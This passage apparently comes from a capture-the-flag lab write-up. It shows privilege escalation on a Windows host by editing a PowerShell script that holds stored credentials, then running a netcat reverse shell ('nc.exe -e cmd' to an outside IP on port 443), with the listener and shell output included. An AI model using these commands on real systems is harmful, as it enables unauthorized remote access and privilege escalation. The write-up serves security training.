
Upon inspecting the .ps1 script we get new credentials, but the password seems strongly encrypted.

```
Invoke-Command -ScriptBlock { cat ..\Desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Cred
ential $cred                                                                                                                 
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000
c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f672800000094971
41b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' 
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

The script runs Get-Volume on ACUTE-PC01 as user jmorgan. As we know from previous enum. User "jmorgan" is local admin on ACUTE-PC01.

Unfortunately we can't run Get-Volume as user imonks on ACUTE-PC01. Access got denied. I'm assuming only high privileged users can run it. But we can try to modify the script and replace the Get-Volume command execution with an reverse connection using netcat to our local listener.

Modified the script:

```
Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.14.57 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Started up my netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Ran the script:

```
Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Gained RCE as user "jmorgan". We are Admin on ACUTE-PC01 now.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.62.38] 49876
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\jmorgan\Documents>
```